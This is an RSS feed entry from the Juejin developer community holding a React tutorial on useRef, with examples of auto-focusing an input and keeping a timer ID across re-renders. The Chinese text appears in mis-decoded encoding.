<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[å½»åº•ææ‡‚ React useRefï¼šä»è‡ªåŠ¨èšç„¦åˆ°éå—æ§è¡¨å•çš„å®Œæ•´æŒ‡å—]]></title>    <link>https://juejin.cn/post/7590054976489062440</link>    <guid>https://juejin.cn/post/7590054976489062440</guid>    <pubDate>2026-01-02T03:00:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590054976489062440" data-draft-id="7589978645135785994" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å½»åº•ææ‡‚ React useRefï¼šä»è‡ªåŠ¨èšç„¦åˆ°éå—æ§è¡¨å•çš„å®Œæ•´æŒ‡å—"/> <meta itemprop="keywords" content="React.js,å‰ç«¯,é¢è¯•"/> <meta itemprop="datePublished" content="2026-01-02T03:00:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é±¼é±¼å—"/> <meta itemprop="url" content="https://juejin.cn/user/4302802432307224"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å½»åº•ææ‡‚ React useRefï¼šä»è‡ªåŠ¨èšç„¦åˆ°éå—æ§è¡¨å•çš„å®Œæ•´æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4302802432307224/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é±¼é±¼å—
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T03:00:55.000Z" title="Fri Jan 02 2026 03:00:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">useRef è¯¦è§£ï¼šä»è‡ªåŠ¨èšç„¦åˆ°éå—æ§è¡¨å•ï¼Œå½»åº•æŒæ¡ React çš„â€œæŒä¹…å¼•ç”¨â€</h2>
<p>åœ¨ React çš„ä¸–ç•Œé‡Œï¼Œ<code>useState</code> æ˜¯å¤§å®¶è€³ç†Ÿèƒ½è¯¦çš„ä¸»è§’â€”â€”å®ƒè´Ÿè´£ç®¡ç†çŠ¶æ€ã€é©±åŠ¨ç•Œé¢æ›´æ–°ã€‚ä½†è¿˜æœ‰ä¸€ä¸ªä½è°ƒå´ä¸å¯æˆ–ç¼ºçš„è§’è‰²ï¼š<strong><code>useRef</code></strong>ã€‚å®ƒä¸åƒ <code>useState</code> é‚£æ ·ä¼šè§¦å‘é‡æ–°æ¸²æŸ“ï¼Œå´åœ¨å¾ˆå¤šå…³é”®åœºæ™¯ä¸­é»˜é»˜æ”¯æ’‘ç€åº”ç”¨çš„æ­£å¸¸è¿è¡Œã€‚ä»Šå¤©ï¼Œæˆ‘ä»¬å°±ç”¨ç”Ÿæ´»åŒ–çš„æ¯”å–»å’ŒçœŸå®ä»£ç ï¼Œå¸¦ä½ å½»åº•ç†è§£ <code>useRef</code> çš„ä¸¤å¤§æ ¸å¿ƒç”¨é€”ã€‚</p>
<hr/>
<h3 data-id="heading-1">ä¸€ã€ä»€ä¹ˆæ˜¯ useRefï¼Ÿå®ƒå’Œ useState æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</h3>
<h4 data-id="heading-2">âœ¨ åŸºæœ¬å®šä¹‰</h4>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">const</span> refContainer = <span class="hljs-title function_">useRef</span>(initialValue);
</code></pre>
<ul>
<li><code>useRef</code> è¿”å›ä¸€ä¸ª<strong>å¯å˜çš„å¼•ç”¨å¯¹è±¡</strong>ï¼Œå…¶ç»“æ„ä¸º <code>{ current: initialValue }</code>ã€‚</li>
<li>è¿™ä¸ªå¯¹è±¡åœ¨ç»„ä»¶çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸå†…<strong>ä¿æŒä¸å˜</strong>ï¼ˆåŒä¸€ä¸ªå¼•ç”¨ï¼‰ã€‚</li>
<li>ä¿®æ”¹ <code>ref.current</code> <strong>ä¸ä¼šè§¦å‘ç»„ä»¶é‡æ–°æ¸²æŸ“</strong>ã€‚</li>
</ul>
<h4 data-id="heading-3">ä¸ useState å¯¹æ¯”</h4>






























<table><thead><tr><th>ç‰¹æ€§</th><th><code>useState</code></th><th><code>useRef</code></th></tr></thead><tbody><tr><td>æ˜¯å¦å¯å˜</td><td>æ˜¯ï¼ˆé€šè¿‡ setter æ›´æ–°ï¼‰</td><td>æ˜¯ï¼ˆç›´æ¥èµ‹å€¼ <code>ref.current = ...</code>ï¼‰</td></tr><tr><td>æ˜¯å¦è§¦å‘é‡æ¸²æŸ“</td><td>âœ… æ˜¯</td><td>âŒ å¦</td></tr><tr><td>ç”¨é€”</td><td>ç®¡ç†éœ€è¦åæ˜ åœ¨ UI ä¸Šçš„çŠ¶æ€</td><td>å­˜å‚¨ä¸éœ€è¦è§¦å‘æ›´æ–°çš„å€¼ / è·å– DOM å…ƒç´ </td></tr><tr><td>åˆå§‹å€¼æ˜¯å¦å‚ä¸ä¾èµ–</td><td>æ˜¯ï¼ˆç”¨äº <code>useEffect</code> ç­‰ï¼‰</td><td>å¦ï¼ˆ<code>.current</code> å˜åŒ–ä¸ä¼šè¢« React æ„ŸçŸ¥ï¼‰</td></tr></tbody></table>
<blockquote>
<p>ğŸ’¡<br/>
<code>useState</code> æ˜¯â€œå…¬å‘Šæ â€â€”â€”å†…å®¹ä¸€å˜ï¼Œå…¨æ‘éƒ½çŸ¥é“ï¼›<br/>
<code>useRef</code> æ˜¯â€œç§äººç¬”è®°æœ¬â€â€”â€”ä½ å†™å¤šå°‘å­—ï¼Œåˆ«äººçœ‹ä¸è§ï¼Œä½†ä½ è‡ªå·±éšæ—¶èƒ½æŸ¥ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-4">ğŸ¯ åœºæ™¯ä¸€ï¼šè®©è¾“å…¥æ¡†â€œè‡ªåŠ¨èšç„¦â€â€”â€”æŒ‚è½½åç«‹åˆ»è·å¾—ç„¦ç‚¹</h3>
<p>æƒ³è±¡ä¸€ä¸‹ä½ æ‰“å¼€ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œå…‰æ ‡å·²ç»è‡ªåŠ¨åœåœ¨ç”¨æˆ·åè¾“å…¥æ¡†é‡Œï¼Œä¸ç”¨ä½ æ‰‹åŠ¨ç‚¹ä¸€ä¸‹â€”â€”æ˜¯ä¸æ˜¯å¾ˆè´´å¿ƒï¼Ÿè¿™ç§ä½“éªŒèƒŒåï¼Œå°±ç¦»ä¸å¼€ <code>useRef</code>ã€‚</p>
<p>æ¥çœ‹è¿™æ®µä»£ç ï¼š</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">import</span> {useRef, useEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> inputRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>); <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªâ€œå¼•ç”¨ç›’å­â€</span>

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    inputRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">focus</span>(); <span class="hljs-comment">// é¡µé¢åŠ è½½å®Œï¼Œç«‹åˆ»èšç„¦</span>
  }, []);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{inputRef}</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> /&gt;</span>
    <span class="hljs-tag">&lt;/&gt;</span></span>
  );
}
</code></pre>
<p>è¿è¡Œå±•ç¤ºï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b3cdef6ae2e41268d1d32b888006f67~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bG86bG85Z2X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767927655&amp;x-signature=iTURgFFuYAhFDUVBCrc4HLf00tQ%3D" alt="æœªå‘½åçš„è®¾è®¡ (3).gif" loading="lazy"/></p>
<h4 data-id="heading-5">ğŸ” å®ƒæ˜¯æ€ä¹ˆå·¥ä½œçš„ï¼Ÿ</h4>
<ul>
<li><code>useRef(null)</code> åˆ›å»ºäº†ä¸€ä¸ª<strong>æŒä¹…å­˜åœ¨çš„å¯¹è±¡</strong>ï¼Œå®ƒçš„ <code>.current</code> å±æ€§åˆå§‹ä¸º <code>null</code>ã€‚</li>
<li>å½“ <code>&lt;input ref={inputRef} /&gt;</code> è¢«æ¸²æŸ“æ—¶ï¼ŒReact ä¼šè‡ªåŠ¨æŠŠçœŸå®çš„ DOM å…ƒç´ ï¼ˆæ¯”å¦‚ <code>&lt;input&gt;</code> æ ‡ç­¾ï¼‰èµ‹å€¼ç»™ <code>inputRef.current</code>ã€‚</li>
<li>åœ¨ <code>useEffect</code>ï¼ˆç»„ä»¶æŒ‚è½½åæ‰§è¡Œï¼‰ä¸­ï¼Œæˆ‘ä»¬è°ƒç”¨ <code>inputRef.current.focus()</code>ï¼Œå°±åƒå¯¹è¿™ä¸ªè¾“å…¥æ¡†è¯´ï¼šâ€œå˜¿ï¼Œå‡†å¤‡å¥½æ¥æ”¶è¾“å…¥å§ï¼â€</li>
</ul>
<p>å½“æˆ‘ä»¬åœ¨æ­¤åŸºç¡€ä¸Šæ·»åŠ å“åº”å¼çŠ¶æ€æ—¶ï¼š</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">import</span> { 
  useState,
  useRef ,
  useEffect
} <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>){
  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>) <span class="hljs-comment">// å“åº”å¼çŠ¶æ€</span>
  
    <span class="hljs-keyword">const</span> inputRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>) <span class="hljs-comment">//åˆå§‹å€¼ä¸ºç©º</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(inputRef.<span class="hljs-property">current</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(count);
    
    <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(inputRef.<span class="hljs-property">current</span>);
      inputRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">focus</span>()
    }, [])
  <span class="hljs-keyword">return</span>(
    <span class="xml"><span class="hljs-tag">&lt;&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{inputRef}</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> /&gt;</span>
    {count}
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setCount(count + 1)}&gt;å¢åŠ <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/&gt;</span></span>
  )
}
</code></pre>
<p>è¿è¡Œç¨‹åºï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/193a6fbcdfaf44a0978557556ce984f0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bG86bG85Z2X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767927655&amp;x-signature=AbGNWNVRvVZQOliP1HOWvU3YQI4%3D" alt="æœªå‘½åçš„è®¾è®¡ (5).gif" loading="lazy"/></p>
<p>æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œç¨‹åºå…ˆæ˜¯è¾“å‡ºäº†refå’Œcountçš„åˆå§‹å€¼nullå’Œ0ï¼Œæ­¤æ—¶è¿”å› JSXï¼ŒReact å‡†å¤‡å°† <code>&lt;input ref={inputRef} /&gt;</code> æŒ‚è½½åˆ° DOMã€‚</p>
<p>React å°† JSX æ¸²æŸ“ä¸ºçœŸå® DOMã€‚
æ­¤æ—¶ï¼Œ<code>&lt;input&gt;</code>Â å…ƒç´ è¢«åˆ›å»ºï¼Œå¹¶ä¸”Â <strong>React è‡ªåŠ¨å°†è¯¥ DOM å…ƒç´ èµ‹å€¼ç»™Â <code>inputRef.current</code></strong>ã€‚è¾“å‡º
&lt; input type="text" &gt;</p>
<p>å½“æˆ‘ä»¬ç‚¹å‡»å¢åŠ æŒ‰é’®æ—¶ï¼Œè§¦å‘é‡æ–°æ¸²æŸ“ï¼Œç¨‹åºè¾“å‡º1å’Œ&lt; input type="text" &gt;ï¼Œä¸ºä»€ä¹ˆuseRefçš„.currentä¸æ˜¯è¾“å‡º<strong>null</strong>ï¼Œé‚£æ˜¯å› ä¸º<code>useRef</code> çš„ <code>.current</code> ä¸€æ—¦è¢« React èµ‹å€¼ï¼Œå°±ä¼šä¸€ç›´ä¿ç•™è¯¥å€¼ï¼Œç›´åˆ°ç»„ä»¶å¸è½½æˆ–æ‰‹åŠ¨ä¿®æ”¹ã€‚</p>
<h4 data-id="heading-6">ğŸ“± é€‚ç”¨åœºæ™¯</h4>
<ul>
<li>ç™»å½•/æ³¨å†Œé¡µçš„é¦–å­—æ®µè‡ªåŠ¨èšç„¦</li>
<li>ç§»åŠ¨ç«¯å‡å°‘ç”¨æˆ·ç‚¹å‡»æ¬¡æ•°ï¼Œæå‡ä½“éªŒ</li>
<li>è¡¨å•å¼¹çª—æ‰“å¼€åè‡ªåŠ¨å®šä½åˆ°ç¬¬ä¸€ä¸ªè¾“å…¥æ¡†</li>
</ul>
<h4 data-id="heading-7"><strong>æ€»ç»“</strong></h4>
<p><code>useState</code> å’Œ <code>useRef</code> çš„æ ¸å¿ƒåŒºåˆ«ï¼š<code>useState</code> ç®¡ç†å“åº”å¼çŠ¶æ€ï¼Œæ›´æ–°ä¼šè§¦å‘ç»„ä»¶é‡æ–°æ¸²æŸ“ï¼›è€Œ <code>useRef</code> åˆ›å»ºä¸€ä¸ªå¯å˜ä¸”æŒä¹…çš„å¼•ç”¨å¯¹è±¡ï¼Œå…¶ <code>.current</code> å€¼åœ¨é¦–æ¬¡æ¸²æŸ“æ—¶ä¸º <code>null</code>ï¼ˆDOM å°šæœªæŒ‚è½½ï¼‰ï¼ŒæŒ‚è½½åæŒ‡å‘çœŸå® DOM å…ƒç´ ï¼Œåç»­æ¸²æŸ“ä¸­ä¿æŒå¼•ç”¨ä¸å˜ï¼Œä¸”ä¿®æ”¹å®ƒä¸ä¼šå¼•èµ·é‡æ¸²æŸ“ã€‚</p>
<hr/>
<h3 data-id="heading-8">â±ï¸ åœºæ™¯äºŒï¼šå­˜å‚¨å®šæ—¶å™¨ IDâ€”â€”é¿å…â€œå¤±è”â€çš„å®šæ—¶ä»»åŠ¡</h3>
<p>å†æ¥çœ‹ä¸€ä¸ªç»å…¸é—®é¢˜ï¼š<strong>ä¸ºä»€ä¹ˆæˆ‘å¯åŠ¨äº†å®šæ—¶å™¨ï¼Œå´æ— æ³•åœæ­¢å®ƒï¼Ÿ</strong></p>
<p>å¦‚æœä½ è¿™æ ·å†™ï¼š</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-comment">// æ­¤å¤„çœå»å¯¼å…¥</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>){
    <span class="hljs-keyword">let</span> intervalId = <span class="hljs-literal">null</span>
    <span class="hljs-keyword">const</span> [count,setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>)
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">start</span>(<span class="hljs-params"/>){
        intervalId = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">()=&gt;</span>{
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'tick~~~'</span>)
    },<span class="hljs-number">1000</span>)
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(intervalId);
}
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span>{
 <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(intervalId);
},[count])
<span class="hljs-keyword">function</span> <span class="hljs-title function_">stop</span>(<span class="hljs-params"/>){
    <span class="hljs-built_in">clearInterval</span>(intervalId)
}

<span class="hljs-keyword">return</span>(
 <span class="xml"><span class="hljs-tag">&lt;&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{start}</span>&gt;</span>å¼€å§‹<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{stop}</span>&gt;</span>åœæ­¢<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  {count}
  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setCount(count + 1)}&gt;å¢åŠ <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
 <span class="hljs-tag">&lt;/&gt;</span></span>
)
</code></pre>
<p>å½“æˆ‘ä»¬ç‚¹å‡»å¼€å§‹æŒ‰é’®æ—¶ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/53d94534a4844ebf8da548912d67f69c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bG86bG85Z2X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767927655&amp;x-signature=M8IuI%2FtoINQtQyEMHKfPTZ8xAa0%3D" alt="æœªå‘½åçš„è®¾è®¡ (6).gif" loading="lazy"/></p>
<p>å®šæ—¶å™¨å¼€å§‹æ¯ç§’æ‰“å°Â <code>'tick~~~'</code>ï¼Œ<strong>æ­¤æ—¶ç»„ä»¶æ²¡æœ‰é‡æ–°æ¸²æŸ“</strong>ï¼Œç‚¹å‡»åœæ­¢æ—¶ï¼Œ<code>clearInterval(id)</code>Â æˆåŠŸæ¸…é™¤å®šæ—¶å™¨ã€‚</p>
<p>è€Œå½“æˆ‘ä»¬ç‚¹å‡»å¢åŠ æŒ‰é’®æ—¶ï¼Œå°±ä¼šå‡ºç°è¿™ç§æƒ…å†µï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/38c7074f065d44bc944975d795895809~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bG86bG85Z2X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767927655&amp;x-signature=0OPbvZ3DlGq4ot1QU8TMF%2B7xgUM%3D" alt="æœªå‘½åçš„è®¾è®¡ (8).gif" loading="lazy"/></p>
<p><strong>tick~~~</strong>æŒç»­è¾“å‡ºï¼Œ<strong>å®šæ—¶å™¨æ— æ³•æ¸…ç†ï¼</strong> é‚£æ˜¯å› ä¸ºå½“æˆ‘ä»¬ç‚¹å‡»å¢åŠ æŒ‰é’®æ—¶ï¼Œç»„ä»¶ä¼šé‡æ–°æ¸²æŸ“ï¼ŒReact ä¼šé‡æ–°è°ƒç”¨ <code>App</code> ç»„ä»¶å‡½æ•°ï¼ˆå³é‡æ–°æ¸²æŸ“ï¼‰ï¼Œ<code>intervalId</code>Â éƒ½ä¼šè¢«<strong>é‡ç½®ä¸ºÂ <code>null</code></strong>ï¼Œ<code>clearInterval(null)</code>Â æ— æ•ˆï¼Œ <strong>çœŸæ­£çš„å®šæ—¶å™¨ ID å·²ç»â€œä¸¢å¤±â€</strong> ï¼Œæ— æ³•è¢«æ¸…é™¤ â†’Â <code>'tick~~~'</code>Â æŒç»­è¾“å‡ºï¼</p>
<p>é—®é¢˜åœ¨äºï¼šæ¯æ¬¡ <code>count</code> å˜åŒ–å¯¼è‡´ç»„ä»¶é‡æ–°æ¸²æŸ“æ—¶ï¼Œ<code>let intervalId = null</code> ä¼šè¢«é‡æ–°æ‰§è¡Œï¼Œä¹‹å‰çš„å®šæ—¶å™¨ ID å°±â€œä¸¢å¤±â€äº†ã€‚</p>
<h4 data-id="heading-9">âœ… æ­£ç¡®åšæ³•ï¼šç”¨ <code>useRef</code> ä¿å­˜ ID</h4>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">import</span> { useRef, useState, useEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> intervalId = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>); <span class="hljs-comment">// âœ… æŒä¹…å­˜å‚¨</span>
  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);

  <span class="hljs-keyword">function</span> <span class="hljs-title function_">start</span>(<span class="hljs-params"/>) {
    intervalId.<span class="hljs-property">current</span> = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'tick~~~'</span>);
    }, <span class="hljs-number">1000</span>);
  }

  <span class="hljs-keyword">function</span> <span class="hljs-title function_">stop</span>(<span class="hljs-params"/>) {
    <span class="hljs-built_in">clearInterval</span>(intervalId.<span class="hljs-property">current</span>);
  }

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{start}</span>&gt;</span>å¼€å§‹<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{stop}</span>&gt;</span>åœæ­¢<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      {count}
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setCount(count + 1)}&gt;å¢åŠ <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/&gt;</span></span>
  );
}

</code></pre>
<h4 data-id="heading-10">ğŸ§© ä¸ºä»€ä¹ˆ useRef èƒ½è§£å†³ï¼Ÿ</h4>
<ul>
<li><code>useRef</code> è¿”å›çš„å¯¹è±¡åœ¨æ•´ä¸ªç»„ä»¶ç”Ÿå‘½å‘¨æœŸä¸­<strong>å§‹ç»ˆæ˜¯åŒä¸€ä¸ªå¯¹è±¡</strong>ã€‚</li>
